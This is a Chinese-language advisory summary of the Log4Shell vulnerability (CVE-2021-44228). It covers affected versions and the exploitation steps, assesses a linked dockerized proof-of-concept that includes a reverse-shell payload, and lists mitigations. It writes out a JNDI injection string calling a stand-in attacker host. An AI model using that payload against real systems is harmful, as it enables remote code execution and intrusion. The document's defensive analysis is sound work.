## CVE-2021-44228 (Log4Shell)

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且启用了消息查找替换功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。该漏洞源于Log4j2在配置、日志消息和参数中使用的JNDI功能没有对攻击者控制的LDAP和其他JNDI相关端点提供足够的保护。

**有效性：**

提供的POC代码有效。它设置了一个dockerized环境，包括一个易受攻击的Java应用程序和一个模拟攻击者的LDAP服务器和HTTP服务器。该POC演示了如何通过JNDI注入执行任意代码。

**投毒风险：**

评估该代码的投毒风险约为10%。主要考虑以下几点：

*   `attacker/Payload.java`: 包含反弹shell的代码，存在被恶意修改的可能。
*   `attacker/index.js`和`attacker/ldap-server.js`:  可能被修改为重定向或记录漏洞利用尝试，虽然不直接执行恶意代码，但可以收集信息。
*   虽然大部分代码的功能是明确的，但在`Payload.java`中嵌入更隐蔽的后门或数据收集行为是可能的。因此存在一定的投毒风险。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI查找字符串的请求。例如：`${jndi:ldap://attacker.com/Exploit}`。
2.  如果目标应用程序使用Log4j2记录该请求，它会尝试解析JNDI查找字符串。
3.  Log4j2通过JNDI连接到攻击者控制的LDAP服务器 (attacker.com)。
4.  LDAP服务器返回一个包含指向攻击者控制的HTTP服务器的Java类的引用。
5.  Log4j2从HTTP服务器下载并执行该Java类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**

*   升级到Log4j 2.17.1 或更高版本（此版本完全移除了有问题的 JNDI 功能）。
*   在旧版本中，设置`log4j2.formatMsgNoLookups=true` 或移除`JndiLookup` 类。

**项目地址:** [qw3rtyou/CVE-2021-44228_dockernize](https://github.com/qw3rtyou/CVE-2021-44228_dockernize)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)